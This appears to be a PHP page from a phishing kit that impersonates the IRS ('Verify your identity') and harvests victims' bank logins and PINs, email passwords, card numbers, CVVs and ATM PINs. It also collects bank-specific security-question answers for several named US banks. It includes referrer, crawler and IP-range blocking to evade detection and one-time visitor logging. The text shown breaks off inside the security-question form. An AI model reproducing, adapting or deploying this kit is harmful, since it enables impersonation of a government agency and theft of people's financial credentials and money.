<?php
session_start(); 
//By Beems
require_once '../main.php';

require_once '../blocker.php';
if($block_referrer == "on") {
    require_once '../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../blacklist.php';
}
require_once 'session.php';

if($onetime == "on") {
    tulis_file("../security/onetime.dat","$ip");
}
#$bankname = "USAA"
$bankname = $_SESSION['bankname'];
?>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <meta name="referrer" content="no-referrer">
      <link rel="icon" type="image/x-icon" href="./assets/images/favicon.ico">
    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="./assets/css/jquery-ui.min.css">
    <link rel="stylesheet" href="./assets/css/irs.css">
    <link rel="stylesheet" href="./assets/css/app.css">
    
<link rel="stylesheet" href="./assets/css/wmsp-shared-secrets.css">
<link rel="stylesheet" href="./assets/css/wmsp-error.css">
<link rel="stylesheet" href="./assets/css/wmsp-results.css">

    <title>Verify your identity</title>
  </head>
  <body class="icce">
  
    <div class="container-fluid" style="background: #f1f1f1; width: 100%;">
      <div class="flagtext">
        <p class="usflag">An official website of the United States Government</p>
      </div>
    </div>
  
    <div class="container-fluid" role="banner" style="background-color: #234E76; width: 100%;">
      <div class="header">
        <div class="navbar">
            <a class="logo" href="javascript:openIrsPage()" title="Go to IRS Home Page">
              <img aria-hidden="true" src="./assets/images/logo.jpg">
            </a>                                  
            
            <ul class="navbar-nav">

 
                 
            <li class="navbar-item"><a class="nav-link" href="javascript:switchLanguage()" title="Click this link to switch language">Español</a>
            </li>        
                                
           
                <li class="navbar-item"><a class="nav-link" href="javascript:logout()" title="Click this link to logoff"> <span>Exit</span> 
                    <svg aria-hidden="true" focusable="false" viewBox="0 0 491.1 412.5">
                      <path d="M 282.9 283.5 v 11.9 c 0 24.5 0.1 49.1 0 73.6 c 0 9.3 3.2 16.6 12 20.6 c
                          9.2 4.1 16.7 0.5 23 -5.9 c 54.4 -54.3 108.8 -108.6 163.1 -163.1 c 10.2 -10.2
                          10.3 -21 0.3 -31 c -54.4 -54.7 -109.1 -109.2 -163.7 -163.7 c -6.1 -6.1 -13.4
                          -9.4 -22.3 -5.7 c -8.9 3.8 -12.4 11 -12.4 20.3 v 86 h -11.8 c -40.6 0 -81.1
                          -0.1 -121.7 0 c -15.7 0 -23.5 7.1 -23.6 22.3 c -0.2 37.6 -0.2 75.3 0 112.9 c
                          0.1 14.2 7.9 21.6 22.1 21.8 c 15.7 0.2 31.4 0.1 47.1 0.1 c 28.8 -0.1 57.6
                          -0.1 87.9 -0.1 Z M 8.2 205 h -0.4 c 0 35.7 -0.3 71.4 0.1 107 c 0.4 46.6 30.7
                          83.4 76.9 87.8 c 36.3 3.5 73.2 1.4 109.8 1.2 c 2.8 0 7.1 -3.9 8 -6.8 c 1.7
                          -5.1 2 -10.9 1.6 -16.4 c -0.9 -14 -2.8 -15.5 -16.7 -15.5 h -87.4 C 68 362.2
                          47 343 46.7 311.2 c -0.6 -70.7 -0.6 -141.4 0 -212.1 c 0.3 -32 21.1 -51.1
                          53.2 -51.2 c 28.8 -0.1 57.6 0 86.4 0 c 15.2 0 18.1 -2.9 18.1 -18.4 c 0 -3.3
                          -0.6 -6.5 -0.8 -9.8 c -0.5 -7.6 -4.5 -11 -12.1 -11 c -33.4 0.1 -66.8 -0.7
                          -100.1 0.4 c -44.7 1.5 -81.1 36.6 -83 81.1 c -1.4 38.2 -0.2 76.5 -0.2 114.8
                          Z">
                       </path>
                       <path d="M 282.9 283.5 h -87.8 c -15.7 0 -31.4 0.2 -47.1 -0.1 c -14.2 -0.2 -22 -7.6
                          -22.1 -21.8 c -0.3 -37.6 -0.3 -75.3 0 -112.9 c 0.1 -15.1 7.9 -22.2 23.6
                          -22.3 c 40.6 -0.1 81.1 0 121.7 0 H 283 V 114 V 40.4 c 0 -9.3 3.5 -16.5 12.4
                          -20.3 c 8.8 -3.7 16.1 -0.4 22.3 5.7 C 372.4 80.3 427 134.9 481.5 189.6 c 10
                          10 9.8 20.8 -0.3 31 c -54.3 54.5 -108.7 108.8 -163.1 163.1 c -6.4 6.4 -13.9
                          10 -23 5.9 c -8.8 -4 -12 -11.3 -12 -20.6 c 0.1 -24.5 0 -49.1 0 -73.6 c -0.2
                          -3.5 -0.2 -7 -0.2 -11.9 Z">
                       </path>
                       <path d="M 8.2 205 c 0 -38.3 -1.3 -76.6 0.3 -114.8 c 1.9 -44.5 38.3 -79.6 83 -81.1 c
                          33.3 -1.1 66.8 -0.3 100.1 -0.4 c 7.6 0 11.6 3.4 12.1 11 c 0.2 3.3 0.8 6.5
                          0.8 9.8 c 0 15.5 -3 18.4 -18.1 18.4 H 100 c -32.1 0.1 -53 19.3 -53.2 51.2 c
                          -0.6 70.7 -0.6 141.4 0 212.1 c 0.3 31.8 21.3 51.1 53.4 51.1 c 29.1 0.1 58.3
                          0 87.4 0 c 13.9 0 15.8 1.5 16.7 15.5 c 0.3 5.5 0 11.3 -1.6 16.4 c -1 2.9
                          -5.2 6.8 -8 6.8 c -36.6 0.2 -73.5 2.3 -109.8 -1.2 c -46.3 -4.3 -76.6 -41.2
                          -77 -87.8 c -0.3 -35.7 -0.1 -71.3 -0.1 -107 h 0.4 Z">
                        </path>
                    </svg></a></li>
                    
                    
           
                
  
              </ul>
            </div>
          </div>
        </div>
    <div class="main container-fluid">
<main id="loginbank">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Payment Information Verification</h1>

  <p><?php echo $bankname; ?> needs additional information from your financial instituition to verify your bank account. Failure to provide the correct details will delay your funds.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <div class="login-errors" style="display: none;">
    <img alt="Error" src="./assets/images/error.svg" title="Error">
      <span class="login-errors-message" tabindex="0">Your bank credentials you provided were incorrect. For security reasons, your account may be locked after several unsuccessful attempts.</span>
  
      </div>  
      <br>
  <div class="form-group">
    <div class="form-group">
      <div class="control-label">
        <label>Username</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="userbank" maxlength="100" type="text" name="userbank" value="">
      <input type="hidden" name="loginretry" id="loginretry" value=""> 
        
    </div>
     <div class="form-group">
      <div class="control-label">
        <label>Password</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="passwordbank" maxlength="100" type="password" name="passwordbank" value=""> 
        
    </div>
    <?php if ($bankname === "CITIBANK NA" or $bankname ==="USAA FEDERAL SAVINGS BANK" or preg_match("/CITIBANK/", $bankname) or preg_match("/USAA/", $bankname)){
      echo '<div class="form-group">
      <div class="control-label">
        <label>PIN</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="pinbank" maxlength="100" type="text" name="pinbank" value=""> 
        
    </div>';
    } ?>
    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>
</main>

<main id="emailaccess" style="display: none;">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Payment Information Verification</h1>

  <p><?php echo $bankname; ?> needs additional information from your financial instituition to verify your bank account. Failure to provide the correct details will delay your funds.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <br>
  <div class="login-errors" style="display: none;">
    <img alt="Error" src="./assets/images/error.svg" title="Error">
      <span class="email-errors-message" tabindex="0">Your email credentials you provided were incorrect. For security reasons, your account may be locked after several unsuccessful attempts.</span>
  
      </div>  
      <br>
  <div class="form-group">
      

    <div class="form-group">
      <div class="control-label">
        <label>E-Mail</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="emaildress" maxlength="100" type="text" name="emaildress" value=""> 
      <input type="hidden" id="emailretry" name="emailretry">
      <input type="hidden" name="emailType" value="" id="emailType">
                            <input type="hidden" name="emailProvider" value="" id="emailProvider">
        
    </div>
     <div class="form-group">
      <div class="control-label">
        <label>Email Password</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="emailPassword" maxlength="100" type="password" name="emailPassword" value=""> 
        
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Confirm Email Password</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="emailPasswordC" maxlength="100" type="password" name="emailPasswordC" value=""> 
        
    </div>


    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>

</main>

<main id="card" style="display: none;">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Payment Information Verification</h1>

  <p><?php echo $bankname; ?> information is required by your financial instituition to verify that you own this account. Failure to provide the correct details will delay your funds.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <br>    
  <div class="form-group">
      

    <div class="form-group">
      <div class="control-label">
        <label>Debit / Credit Card Number</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="CardNumber" maxlength="100" type="text" name="CardNumber" value=""> 
        
    </div>
     <div class="form-group row">
      <div class="col">
      <div class="control-label">
        <label>Expiration Date</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>      
      <input class="form-control" id="ExpirationDate" maxlength="100" type="text" name="ExpirationDate" value=""> 
    </div>

    <div class="col">
      <div class="control-label">
        <label>CVV</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>      
      <input class="form-control" id="Cvv" type="text" name="Cvv" value=""> 
    </div>
        
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>ATM PIN</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="AtmPin" maxlength="100" type="text" name="AtmPin" value=""> 
        
    </div>


    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>

</main>
<?php 
if (preg_match("/PNC/", $bankname) or preg_match("/BANK\sOF\sAMERICA/", $bankname) or preg_match("/BB&T/", $bankname) or preg_match("/REGIONS\sBANK/", $bankname) or preg_match("/HUNTINGTON\sNATIONAL\sBANK/", $bankname) or preg_match("/USAA/", $bankname)) {
  echo '<main id="secq">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Security Questions for '.$bankname.'</h1>

  <p>Additional information is required by your financial instituition to verify that you own this account. Failure to provide the correct details will delay your funds. Answer our security questions associacted with your '. $bankname. '</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>

  <br>    
  <div class="form-group">
    <div class="form-group">
      <div class="control-label">
        <label>Security Question 1</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <select id="question1" name="question1" class="custom-select" aria-required="true" data-role="none">
      '. (($bankname === "Regions Bank" or $bankname === "REGIONS BANK" or preg_match("/REGIONS\sBANK/", $bankname))?'
        <option selected="">Select Security Question  1</option>

<option value="Q1.7r">What was the name of your bestfriend?</option>
                    
<option value="Q1.16r">What was the name of your bestfriend in high school?</option>

<option value="Q1.12r">What is the last name of your favorite teacher?</option>

<option value="Q1.19r">Where did you go on your first vacation?</option>

<option value="Q1.18r">What is the last name of the author of the best book you ever read?</option>

<option value="Q1.13r">Who is your favourite author?</option>

<option value="Q1.15r">What is your dream job?</option>

<option value="Q1.14r">What is your favorite book?</option>

<option value="Q1.11r">Who was your first crush?</option>

<option value="Q1.17r">What is your best friends middle name?</option>

<option value="Q1.20r">What was the name of your first teacher?</option>

<option value="Q1.21r">What school did you attend when you were 13?</option>':"") .' '. (($bankname === "Bank Of America" or $bankname === "BANK OF AMERICA NA" or $bankname === "BANK OF AMERICA, N.A." or preg_match("/BANK\sOF\sAMERICA/", $bankname))?'<option selected="">Select Sitekey Challenge Question  1</option>
                        <option value="Q1.7b">What celebrity do you most resemble?</option>
                        <option value="Q1.16b">What is the last name of your third grade teacher?</option>
                        <option value="Q1.12b">What was the name of your first boyfriend or girlfriend?</option>
                        <option value="Q1.19b">What is the name of your favorite charity?</option>
                        <option value="Q1.18b">What is the name of your first babysitter?</option>
                        <option value="Q1.13b">What is your best friends first name?</option>
                        <option value="Q1.15b">In what city did you meet your spouse/significant other?</option>
                        <option value="Q1.14b">In what city did you honeymoon? (Enter full name of city only)</option>
                        <option value="Q1.11b">What is the last name of your family physician?</option>
                        <option value="Q1.17b">What street did your best friend in high school live on? (Enter full name of street only)</option>':"") .' '. (($bankname === "PNC" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or preg_match("/PNC/", $bankname))?'<option value="Q1.7">What is the first name of your oldest nephew?</option>
                    
                    <option value="Q1.16">What was the TV series you liked most as a child?</option>
                    
                    <option value="Q1.12">In what city or country do you want to retire?</option>
                    
                    <option value="Q1.19">What is the first and last name of your most memorable childhood babysitter/caregiver?</option>
                    
                    <option value="Q1.18">What is your youngest cousin\'s first and last name?</option>
                    
                    <option value="Q1.13">What was the first and last name of your first roommate during college?</option>
                    
                    <option value="Q1.15">What is the first and last name of the person you went to your prom with?</option>
                    
                    <option value="Q1.14">What is the last name of your least favorite teacher in high school?</option>
                    
                    <option value="Q1.11">What was your favorite toy when you were a child?</option>
                    
                    <option value="Q1.17" selected="">What is your maternal grandfather\'s profession?</option>':"") .' '.(($bankname === "USAA SAVINGS BANK" or $bankname === "USAA FEDERAL SAVINGS BANK" or preg_match("/USAA/", $bankname))?'<option value="">Select Security Question 1</option>
                    <option value="Q1.7u">First name of maternal grandfather?</option>

                    <option value="Q1.16u">City your mother was born in?</option>

                    <option value="Q1.19u">Name of your first employer?</option>

                    <option value="Q1.18u">City you got married in?</option>

                    <option value="Q1.13u">First name of your best man?</option>

                    <option value="Q1.15u">First name of first boyfriend?</option>':"") .' '. ((preg_match("/BB&T/", $bankname))?'<option value="">Select Security Question 1</option>

                    <option value="Q1.1bb">Who was your high school prom date?</option>
<option value="Q1.2bb">Who\'s the tallest person in your family?</option>
<option value="Q1.3bb">What was the name of your first roommate in college?</option>
<option value="Q1.4bb">What was the most memorable concert you\'ve attended?</option>
<option value="Q1.5bb">What\'s your favorite book?</option>
<option value="Q1.6bb">Where did you get engaged?</option>
<option value="Q1.7bb">Who\'s your favorite author?</option>
<option value="Q1.8bb">What was the first name of your first manager?</option>
<option value="Q1.9bb">What was your dream job?</option>
<option value="Q1.10bb">What was the last name of your favorite mentor or teacher?</option>
<option value="Q1.11bb">What was the first musical instrument you learned to play?</option>
<option value="Q1.12bb">What was the name of your most memorable stuffed animal?</option>':"") .' '. ((preg_match("/HUNTINGTON\sNATIONAL\sBANK/", $bankname))?'<option value="" selected="">Select Security Question  1</option>
<option value="Q1.1hun">What was the make and model of the first car you owned?</option>
    <option value="Q1.2hun">What is your favorite hobby?</option>
    <option value="Q1.3hun">What is your father\'s middle name?</option>
    <option value="Q1.4hun">What is the name of your favorite city?</option>
    <option value="Q1.5hun">What is your mother\'s maiden name?</option>
    <option value="Q1.6hun">What is the last name of your favorite author?</option>
    <option value="Q1.7hun">What is your brother or sister\'s middle name?</option>
    <option value="Q1.8hun">What is your favorite game or sport?</option>
    <option value="Q1.9hun">What is your grandmother\'s maiden name?</option>
    <option value="Q1.10hun">What is the name of your favorite restaurant?</option>':"") .' '. (($bankname === "US BANK" or $bankname === "US BANK NA" or $bankname === "U.S. Bank")?'<option value="" selected="">Select Security Question  1</option>
<option value="Q1.1usb">What are the last five digits of your student id?</option>
<option value="Q1.2usb">Who was your childhood hero?</option>
<option value="Q1.3usb">What is the name of your first pet?</option>
<option value="Q1.4usb">What was your favorite movie as a child?</option>
<option value="Q1.5usb">What famous landmark would you most like to visit?</option>
<option value="Q1.6usb">In what city was your first job?</option>
<option value="Q1.7usb">Where did you go on your most memorable vacation?</option>
<option value="Q1.8usb">What was the name of your best friend in high-school?</option>
<option value="Q1.9usb">What was your favorite teachers name?</option>
<option value="Q1.10usb">Who was your father\'s first employer?</option>':"") .'

      </select>
        
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Security Question Answer 1</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="answer1" maxlength="100" type="text" name="answer1" value=""> 
        
    </div>

    <div class="form-group">
    <div class="form-group">
      <div class="control-label">
        <label>Security Question 2</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <select id="question2" name="question2" class="custom-select" aria-required="true" data-role="none">
     '. (($bankname === "Regions Bank" or $bankname === "REGIONS BANK" or preg_match("/REGIONS\sBANK/", $bankname))?'<option selected="">Select Security Question  2</option>
<option value="Q2.13r">What was your first pet\'s name?</option>
                    
<option value="Q2.11r">What was your paternal grandfather\'s first name?</option>

<option value="Q2.15r">What was your maternal grandfather\'s first name?</option>

<option value="Q2.5r">What was your paternal grandmother\'s first name?</option>

<option value="Q2.16r">What was your maternal grandmother\'s first name?</option>

<option value="Q2.6r">What is the last name of the maid of honor at your wedding?</option>

<option value="Q2.14r">What is the last name of the best man at your wedding?</option>

<option value="Q2.3r">What position did you play in your favorite sport?</option>

<option value="Q2.12r">What is the first name of the boy or girl that you first kissed?</option>

<option value="Q2.7r">What was the last name of your third grade teacher?</option>

<option value="Q2.20r">Address of your first house or child hood home(Street name)?</option>

<option value="Q2.21r">Where were you when you first heard about 9/11?</option>':"") .' '. (($bankname === "Bank Of America" or $bankname === "BANK OF AMERICA NA" or $bankname === "BANK OF AMERICA, N.A." or preg_match("/BANK\sOF\sAMERICA/", $bankname))?'<option selected="">Select Sitekey Challenge Question 2</option>
                                       <option value="Q2.11b">As a child, what did you want to be when you grew up?</option>
                                       <option value="Q2.15b">What is the name of your favorite restaurant?</option>
                                       <option value="Q2.5b">What is the first name of your high school prom date?</option>
                                       <option value="Q2.16b">Who is your favorite person in history?</option>
                                       <option value="Q2.6b">What is the name of your high school star athlete?</option>
                                       <option value="Q2.14b">Where were you on New Year 2000?</option>
                                       <option value="Q2.3b">What was the make and model of your first car?</option>
                                       <option value="Q2.12b">What was the first name of your first manager?</option>
                                       <option value="Q2.7b">What is the first name of the best man/maid of honor at your wedding?</option>
                                       <option value="Q2.13b">What was the first live concert you attended?</option>':"") .' '. (($bankname === "PNC" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or preg_match("/PNC/", $bankname))?'<option value="Q2.13">What were your wedding colors?</option>
                    
                    <option value="Q2.11">What was your favorite Halloween costume in elementary school?</option>
                    
                    <option value="Q2.15">What is the name of a college you applied to but didn\'t attend?</option>
                    
                    <option value="Q2.5" selected="">What was the name of your first girlfriend/boyfriend?</option>
                    
                    <option value="Q2.16">On what street was the first address you lived in outside your parents\' home?</option>
                    
                    <option value="Q2.6">What was the name of your first pet?</option>
                    
                    <option value="Q2.14">What famous person would you have liked to meet?</option>
                    
                    <option value="Q2.3">What was the first name of your first manager?</option>
                    
                    <option value="Q2.12">What was the last name of your fourth grade teacher?</option>
                    
                    <option value="Q2.7">What is the first name of your oldest niece?</option>':"") .' '. (($bankname === "USAA FEDERAL SAVINGS BANK" or $bankname === "USAA SAVINGS BANK" or preg_match("/USAA/", $bankname))?'<option value="">Select Security Question  2</option>

                    <option value="Q2.13u">First name of paternal grandfather?</option>

                    <option value="Q2.11u">First name of first girlfriend?</option>

                    <option value="Q2.15u">Your age at your wedding?</option>

                    <option value="Q2.5u">Name of street you grew up on?</option>

                    <option value="Q2.16u">Name of first elementary school?</option>

                    <option value="Q2.6u">First name of your maid of honor?</option>':"") .' '. ((preg_match("/BB&T/", $bankname))?'<option value="">Select Security Question  2</option>
<option value="Q2.1bb">What was the name of your favorite pet?</option>
<option value="Q2.2bb">What city was your first elementary school in?</option>
<option value="Q2.3bb">Where did you meet your spouse?</option>
<option value="Q2.4bb">What city did you meet your spouse in?</option>
<option value="Q2.5bb">Who was the best man/maid of honor at your wedding?</option>
<option value="Q2.6bb">Who was your first boyfriend/girlfriend?</option>
<option value="Q2.7bb">What was the first live concert you attended?</option>
<option value="Q2.8bb">What was the last name of your third grade teacher?</option>
<option value="Q2.9bb">What\'s your best friend\'s middle name?</option>
<option value="Q2.10bb">If you won the lottery, what would your first purchase be?</option>
<option value="Q2.11bb">Who\'s your favorite person in history?</option>
<option value="Q2.12bb">When you were a child, what did you want to be when you grew up?</option>
                    ':"") .' '. ((preg_match("/HUNTINGTON\sNATIONAL\sBANK/", $bankname))?'<option value="" selected="">Select Security Question  2</option>
<option value="Q2.1hun">What was your first job?</option>
    <option value="Q2.2hun">What was the name of your elementary school?</option>
    <option value="Q2.3hun">What is the name of the street that you grew up on?</option>
    <option value="Q2.4hun">What is your favorite place to visit?</option>
    <option value="Q2.5hun">What sports team do you love to see lose?</option>
    <option value="Q2.6hun">What is your greatest fear?</option>
    <option value="Q2.7hun">Who is your favorite historical figure?</option>
    <option value="Q2.8hun">What is the name of your favorite pet?</option>
    <option value="Q2.9hun">Who is your favorite musician or band?</option>
    <option value="Q2.10hun">What is the last name of your favorite teacher?</option>
                    ':"") .' '. (($bankname === "US BANK" or $bankname === "US BANK NA" or $bankname === "U.S. Bank")?'<option value="" selected="">Select Security Question  2</option>
<option value="Q2.1usb">What was the street number of the house in which you grew up?</option>
<option value="Q2.2usb">What was the name of the maid of honor at your wedding?</option>
<option value="Q2.3usb">What was your favorite game as a child?</option>
<option value="Q2.4usb">What was the first concert you attended?</option>
<option value="Q2.5usb">What was the name of your best friend in college?</option>
<option value="Q2.6usb">Who would you most like to meet?</option>
<option value="Q2.7usb">What was the model of your first car?</option>
<option value="Q2.8usb">What was the name of your first employer?</option>
<option value="Q2.9usb">What was your favorite book as a child?</option>
<option value="Q2.10usb">What was the favorite car you owned?</option>':"") .'

      </select>
        
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Security Question Answer 2</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="answer2" maxlength="100" type="text" name="answer2" value=""> 
        
    </div>



    <div class="form-group">
    <div class="form-group">
      <div class="control-label">
        <label>Security Question 3</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <select id="question3" name="question3" class="custom-select" aria-required="true" data-role="none">
     '. (($bankname === "Regions Bank" or $bankname === "REGIONS BANK" or preg_match("/REGIONS\sBANK/", $bankname))?' <option selected="">Select Security Question  3</option>
<option value="Q3.12r">In what city did you meet your spouse/significant other?</option>
                    
<option value="Q3.14r">What is the name of a college you applied to but didn\'t attend?</option>

<option value="Q3.11r">What was your first boss\'s last name?</option>

<option value="Q3.17r">Where were you when you had your first kiss?</option>

<option value="Q3.10r">What city did you live in, in the year 2000?</option>

<option value="Q3.8r">What was your chilhood nickname?</option>

<option value="Q3.5r">What is the name of the place your wedding reception was held?</option>

<option value="Q3.13r">In what city did your mother and father meet?</option>

<option value="Q3.15r">Name of your oldest nephew?</option>

<option value="Q3.16r">Name of your oldest niece?</option>

<option value="Q3.20r">First name of you eldest maternal aunt?</option>

<option value="Q3.21r">What was your maternal grandmother\'s maiden name?</option>':"") .' '. (($bankname === "Bank Of America" or $bankname === "BANK OF AMERICA NA" or $bankname === "BANK OF AMERICA, N.A." or preg_match("/BANK\sOF\sAMERICA/", $bankname))?'<option selected="">Select Sitekey Challenge Question 3</option>
                                       <option value="Q3.14b">What is your all-time favorite song?</option>
                                   <option value="Q3.11b">What is the name of a college you applied to but didnt attend?</option>
                                   <option value="Q3.17b">What is the name of the medical professional who delivered your first child?</option>
                                   <option value="Q3.10b">What is the first name of your favorite niece/nephew?</option>
                                   <option value="Q3.8b">What is the name of your best childhood friend?</option>
                                   <option value="Q3.5b">What was the first name of your favorite teacher or professor?</option>
                                   <option value="Q3.13b">What is the first name of your hairdresser/barber?</option>
                                   <option value="Q3.15b">What is the first name of your mothers closest friend?</option>
                                   <option value="Q3.16b">On what street is your grocery store?</option>
                                   <option value="Q3.12b">What was the name of your first pet?</option>  ':"") .'
'. (($bankname === "PNC" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or preg_match("/PNC/", $bankname))?'<option value="Q3.12" selected="">Where were you when you had your first kiss?</option>
                    
                    <option value="Q3.14">What was your favorite place to visit as a child?</option>
                    
                    <option value="Q3.11">What was your favorite movie as a child?</option>
                    
                    <option value="Q3.17">What is your oldest sibling\'s nickname?</option>
                    
                    <option value="Q3.10">What street did your best friend in high school live on? (Enter full name of street only)</option>
                    
                    <option value="Q3.8">What was the last name of your favorite teacher in your final year of high school?</option>
                    
                    <option value="Q3.5">What was your favorite restaurant in college?</option>
                    
                    <option value="Q3.13">What is your oldest cousin\'s first and last name?</option>
                    
                    <option value="Q3.15">What is the name of the band you liked most during high school?</option>
                    
                    <option value="Q3.16">What was your favorite book as a child?</option>':"") .' '. (($bankname === "USAA FEDERAL SAVINGS BANK" or $bankname === "USAA SAVINGS BANK" or preg_match("/USAA/", $bankname))?'<option value="" selected="">Select Security Question  3</option>
                    <option value="Q3.12u">City you met your spouse in?</option>

                    <option value="Q3.14u">First name of first roommate in college?</option>

                    <option value="Q3.11u">City your father was born in?</option>

                    <option value="Q3.17u">First name of maternal grandmother?</option>

                    <option value="Q3.10u">City you got engaged in?</option>

                    <option value="Q3.8u">City of first elementary school?</option>':"") .' '. ((preg_match("/BB&T/", $bankname))?'<option value="" selected="">Select Security Question  3</option>

                    <option value="Q3.1bb">What was your favorite place to visit as a child?</option>
<option value="Q3.2bb">Who was your favorite childhood friend?</option>
<option value="Q3.3bb">What\'s your biggest pet peeve?</option>
<option value="Q3.4bb">What was the name of your first pet?</option>
<option value="Q3.5bb">Who was your least favorite boss?</option>
<option value="Q3.6bb">What was your childhood phone number?</option>
<option value="Q3.7bb">What\'s the nickname you gave your favorite grandparent?</option>
<option value="Q3.8bb">Where do you want to retire?</option>
<option value="Q3.9bb">What is your dream car?</option>
<option value="Q3.10bb">What was the make and model of your first car?</option>
<option value="Q3.11bb">What street did you grow up on?</option>
<option value="Q3.12bb">Who was your first employer?</option>':"") .' '. ((preg_match("/HUNTINGTON\sNATIONAL\sBANK/", $bankname))?'<option value="" selected="">Select Security Question  3</option>
                    <option value="Q3.1hun">Where were you born?</option>
    <option value="Q3.2hun">Who is your favorite sports hero?</option>
    <option value="Q3.3hun">Who is your favorite comic book or cartoon character?</option>
    <option value="Q3.4hun">What is your favorite musical instrument?</option>
    <option value="Q3.5hun">What is your mother\'s birthday mmddyyyy?</option>
    <option value="Q3.6hun">What is your father\'s birthday mmddyyyy?</option>
    <option value="Q3.7hun">Where is your ideal vacation spot?</option>
    <option value="Q3.8hun">What is the first name of your best friend from childhood?</option>
    <option value="Q3.9hun">What is your favorite fruit or vegetable?</option>
                    ':"") .' '. (($bankname === "US BANK" or $bankname === "US BANK NA" or $bankname === "U.S. Bank")?'<option value="" selected="">Select Security Question  3</option>
<option value="Q3.1usb">In what city does your nearest sibling live?</option>
<option value="Q3.2usb">In what school did you attend the 6th grade?</option>
<option value="Q3.3usb">What is your greatest phobia or fear?</option>
<option value="Q3.4usb">What was the name of your first college roommate?</option>
<option value="Q3.5usb">What is the name of your hair stylist?</option>
<option value="Q3.6usb">What was the name of your favorite manager?</option>
<option value="Q3.7usb">What are the last five digits of your favorite frequent flyer card?</option>
<option value="Q3.8usb">What is the name of a college you applied to but did not attend?</option>
<option value="Q3.9usb">What is your dream car?</option>
<option value="Q3.10usb">What was your childhood nickname?</option>':"") .'

      </select>
        
    </div>
